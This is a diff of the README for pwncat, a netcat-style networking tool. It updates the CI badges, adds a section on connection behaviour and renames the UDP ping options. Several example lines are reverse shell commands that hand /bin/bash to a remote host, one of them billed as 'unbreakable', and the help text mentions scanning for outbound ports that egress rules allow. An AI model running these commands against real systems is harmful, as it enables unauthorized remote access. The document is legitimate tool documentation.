@@ -3,11 +3,11 @@
 **[Install](#tada-install)** |
 **[TL;DR](#coffee-tldr)** |
 **[Features](#star-features)** |
+**[Behaviour](#cop-behaviour)** |
 **[Docs](#closed_book-documentation)** |
 **[Usage](#computer-usage)** |
 **[Examples](#bulb-examples)** |
 **[FAQ](#information_source-faq)** |
-**[cytopia sec tools](#lock-cytopia-sec-tools)** |
 **[Contributing](#octocat-contributing)** |
 **[Disclaimer](#exclamation-disclaimer)** |
 **[License](#page_facing_up-license)**
@@ -55,7 +55,7 @@
        <td><a href="https://github.com/cytopia/pwncat/actions?workflow=black"><img src="https://github.com/cytopia/pwncat/workflows/black/badge.svg" /></a></td>
       </tr>
       <tr>
-       <td><a href="https://github.com/python/mypy">mypy</a></td>
+       <td><a href="https://github.com/python/mypy">mypy</a> <sup><small>[1]</small></sup></td>
        <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mypy"><img src="https://github.com/cytopia/pwncat/workflows/mypy/badge.svg" /></a></td>
       </tr>
       <tr>
@@ -81,33 +81,51 @@
        <th><sub>Python</sub><sup>OS</sup></th>
        <th>Linux</th>
        <th>MacOS</th>
-       <th>Windows</th>
+       <th>Windows <sup><small>[2]</small></sup></th>
       </tr>
      </thead>
      <tbody>
       <tr>
        <th>2.7</th>
-       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=lin-2.7"><img src="https://github.com/cytopia/pwncat/workflows/lin-2.7/badge.svg" /></a></td>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-2.7"><img src="https://github.com/cytopia/pwncat/workflows/ubu-2.7/badge.svg" /></a></td>
        <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-2.7"><img src="https://github.com/cytopia/pwncat/workflows/mac-2.7/badge.svg" /></a></td>
        <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-2.7"><img src="https://github.com/cytopia/pwncat/workflows/win-2.7/badge.svg" /></a></td>
       </tr>
       <tr>
+       <th>3.5</th>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-3.5"><img src="https://github.com/cytopia/pwncat/workflows/ubu-3.5/badge.svg" /></a></td>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-3.5"><img src="https://github.com/cytopia/pwncat/workflows/mac-3.5/badge.svg" /></a></td>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-3.5"><img src="https://github.com/cytopia/pwncat/workflows/win-3.5/badge.svg" /></a></td>
+      </tr>
+      <tr>
        <th>3.6</th>
-       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=lin-3.6"><img src="https://github.com/cytopia/pwncat/workflows/lin-3.6/badge.svg" /></a></td>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-3.6"><img src="https://github.com/cytopia/pwncat/workflows/ubu-3.6/badge.svg" /></a></td>
        <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-3.6"><img src="https://github.com/cytopia/pwncat/workflows/mac-3.6/badge.svg" /></a></td>
        <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-3.6"><img src="https://github.com/cytopia/pwncat/workflows/win-3.6/badge.svg" /></a></td>
       </tr>
       <tr>
        <th>3.7</th>
-       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=lin-3.7"><img src="https://github.com/cytopia/pwncat/workflows/lin-3.7/badge.svg" /></a></td>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-3.7"><img src="https://github.com/cytopia/pwncat/workflows/ubu-3.7/badge.svg" /></a></td>
        <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-3.7"><img src="https://github.com/cytopia/pwncat/workflows/mac-3.7/badge.svg" /></a></td>
        <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-3.7"><img src="https://github.com/cytopia/pwncat/workflows/win-3.7/badge.svg" /></a></td>
       </tr>
       <tr>
        <th>3.8</th>
-       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=lin-3.8"><img src="https://github.com/cytopia/pwncat/workflows/lin-3.8/badge.svg" /></a></td>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-3.8"><img src="https://github.com/cytopia/pwncat/workflows/ubu-3.8/badge.svg" /></a></td>
        <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-3.8"><img src="https://github.com/cytopia/pwncat/workflows/mac-3.8/badge.svg" /></a></td>
        <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-3.8"><img src="https://github.com/cytopia/pwncat/workflows/win-3.8/badge.svg" /></a></td>
+      </tr>
+      <tr>
+       <th>pypy2</th>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-pypy2"><img src="https://github.com/cytopia/pwncat/workflows/ubu-pypy2/badge.svg" /></a></td>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-pypy2"><img src="https://github.com/cytopia/pwncat/workflows/mac-pypy2/badge.svg" /></a></td>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-pypy2"><img src="https://github.com/cytopia/pwncat/workflows/win-pypy2/badge.svg" /></a></td>
+      </tr>
+      <tr>
+       <th>pypy3</th>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-pypy3"><img src="https://github.com/cytopia/pwncat/workflows/ubu-pypy3/badge.svg" /></a></td>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-pypy3"><img src="https://github.com/cytopia/pwncat/workflows/mac-pypy3/badge.svg" /></a></td>
+       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-pypy3"><img src="https://github.com/cytopia/pwncat/workflows/win-pypy3/badge.svg" /></a></td>
       </tr>
      </tbody>
     </table>
@@ -115,6 +133,9 @@
   </tr>
  </tbody>
 <table>
+
+> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 93.66%)</strong></sup><br/>
+> <sup>[2] Windows builds are currently only failing, because they are simply stuck on GitHub actions.</sup>
 
 
 #### Motivation
@@ -160,7 +181,7 @@ pwncat -e '/bin/bash' example.com 4444 --recon --recon-wait 10
 ```
 ```bash
 # Reverse UDP shell (Ctrl+c proof)
-pwncat -e '/bin/bash' example.com 4444 -u --udp-ping-intvl 10
+pwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 10
 ```
 
 ### Local port forward `-L` (listening proxy)
@@ -209,22 +230,64 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 | Compatability  | Use the traditional `netcat` as a client or server together with `pwncat` |
 
 
+## :cop: Behaviour
+
+Like the original implementation of `netcat`, when using **TCP**, `pwncat`
+(in client and listen mode) will automatically quit, if the network connection has been terminated,
+properly or improperly.
+
+In case the remote peer does not terminate the connection, or in **UDP** mode, `pwncat` will stay open.
+
+Have a look at the following illustratoins to better understand the behaviour:
+
+```bash
+# [Valid HTTP request] Does not quit, web server keeps connection intact
+printf "GET / HTTP/1.1\n\n" | pwncat www.google.com 80
+```
+
+```bash
+# [Invalid HTTP request] Quits, because the web server closes the connection
+printf "GET / \n\n" | pwncat www.google.com 80
+```
+
+```bash
+# [TCP]
+# Neither of both, client and server will quit after successful transfer
+# and they will be stuck, waiting for more input or output.
+# When exiting one (e.g.: via Ctrl+c), the other one will quit as well.
+pwncat -l 4444 > output.txt
+pwncat localhost 4444 < input.txt
+```
+
+```bash
+# [UDP]
+# Neither of both, client and server will quit after successful transfer
+# and they will be stuck, waiting for more input or output.
+# When exiting one (e.g.: via Ctrl+c), the other one will still stay open in UDP mode.
+pwncat -u -l 4444 > output.txt
+pwncat -u localhost 4444 < input.txt
+```
+
+There are many ways to alter this default behaviour. Have a look at the [usage](#computer-usage)
+section for more advanced adjustments.
+
 
 ## :closed_book: Documentation
 
 Documentation will evolve over time.
 
 * API docs can be found here: [pwncat.api.html](https://cytopia.github.io/pwncat/pwncat.api.html)
+* Python type coverage can be found here: [pwncat.type.html](https://cytopia.github.io/pwncat/pwncat.type.html)
 * HTML man page can be found here: [pwncat.man.html](https://cytopia.github.io/pwncat/pwncat.man.html)
 * Raw man page can be found here: [pwncat.1](man/pwncat.1)
 
 
 ## :computer: Usage
 
-See all available options below.
+Type `pwncat -h` or click below to see all available options.
 
 <details>
-  <summary><stront>Click to expand</strong></summary>
+  <summary><strong>Click here to expand usage</strong></summary>
 
 ```
 usage: pwncat [-Cnuv] [-e cmd] hostname port
@@ -285,7 +348,12 @@ mode arguments:
 
 optional arguments:
   -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
-  -C, --crlf            Replace LF with CRLF from stdin (default: don't)
+  -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing
+                        line endings for input and outout accordingly. Specify
+                        'no' to completely remove any line feeds. By default
+                        it will not replace anything and takes what is entered
+                        (usually CRLF on Windows, LF on Linux and some times
+                        CR on MacOS).
   -n, --nodns           Do not resolve DNS.
   -u, --udp             Use UDP for the connection instead of TCP.
   -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv
@@ -311,7 +379,7 @@ advanced arguments:
 
   --rebind x            Listen mode (TCP and UDP):
                         If the server is unable to bind, it will re-initialize
-                        itself x many times before giving up. Use 0 to re-init
+                        itself x many times before giving up. Use -1 to re-init
                         endlessly. (default: fail after first unsuccessful try).
 
   --rebind-wait s       Listen mode (TCP and UDP):
@@ -328,7 +396,7 @@ advanced arguments:
   --reconn x            Connect mode / Zero-I/O mode (TCP only):
                         If the remote server is not reachable or the connection
                         is interrupted, the client will connect again x many
-                        times before giving up. Use 0 to retry endlessly.
+                        times before giving up. Use -1 to retry endlessly.
                         (default: quit if the remote is not available or the
                         connection was interrupted)
                         This might be handy for stable TCP reverse shells ;-)
@@ -356,7 +424,7 @@ advanced arguments:
                         Note: if --reconn is specified, the connection will be
                         re-opened.
 
-  --udp-ping-init       Connect mode / Zero-I/O mode (UDP only):
+  --ping-init           Connect mode / Zero-I/O mode (TCP and UDP):
                         UDP is a stateless protocol unlike TCP, so no hand-
                         shake communication takes place and the client just
                         sends data to a server without being "accepted" by
@@ -366,31 +434,30 @@ advanced arguments:
                         before the client hasn't send data first. The server
                         simply doesn't know the IP address before an initial
                         connect.
-                        The --udp-ping-init option instructs the client to send
-                        one single initial ping packet to the server, so that it
-                        is able to talk to the client.
+                        The --ping-init option instructs the client to send one
+                        single initial ping packet to the server, so that it is
+                        able to talk to the client.
                         This is the only way to make a UDP reverse shell work.
-                        See --udp-ping-word for what char/string to send as
-                        initial ping packet (default: '\0')
+                        See --ping-word for what char/string to send as initial
+                        ping packet (default: '\0')
 
-  --udp-ping-intvl s    Connect mode / Zero-I/O mode (UDP only):
-                        Instruct the UDP client to send ping intervalls every
-                        s seconds. This allows you to restart your UDP server
-                        and just wait for the client to report back in.
-                        This might be handy for stable UDP reverse shells ;-)
-                        See --udp-ping-word for what char/string to send as
-                        initial ping packet (default: '\0')
+  --ping-intvl s        Connect mode / Zero-I/O mode (TCP and UDP):
+                        Instruct the client to send ping intervalls every s sec.
+                        This allows you to restart your UDP server and just wait
+                        for the client to report back in. This might be handy
+                        for stable UDP reverse shells ;-)
+                        See --ping-word for what char/string to send as initial
+                        ping packet (default: '\0')
 
-  --udp-ping-word str   Connect mode / Zero-I/O mode (UDP only):
+  --ping-word str       Connect mode / Zero-I/O mode (TCP and UDP):
                         Change the default character '\0' to use for upd ping.
                         Single character or strings are supported.
 
-  --udp-ping-robin port
-                        Zero-I/O mode (UDP only):
-                        Instruct the UDP client to shuffle the specified ports
-                        in round-robin mode for a remote server to ping.
+  --ping-robin port     Connect mode / Zero-I/O mode (TCP and UDP):
+                        Instruct the client to shuffle the specified ports in
+                        round-robin mode for a remote server to ping.
                         This might be handy to scan outbound allowed ports.
-                        Use --udp-ping-intvl 0 to be faster.
+                        Use --ping-intvl 0 to be faster.
 
   --safe-word str       All modes:
                         If pwncat is started with this argument, it will shut
@@ -450,9 +517,9 @@ Why unbreakable? Because it will keep coming to you, even if you kill your liste
 # --exec            # Provide this executable
 # --nodns           # Keep the noise down and don't resolve hostnames
 # --udp             # Use UDP mode
-# --udp-ping-intvl  # Ping the server every 10 seconds
+# --ping-intvl      # Ping the server every 10 seconds
 
-pwncat --exec /bin/bash --nodns --udp --udp-ping-intvl 10 10.0.0.1 4444
+pwncat --exec /bin/bash --nodns --udp --ping-intvl 10 10.0.0.1 4444
 ```
 If you feel like, you can start your listener in full TRACE logging mode to figure out what's going on
 ```bash
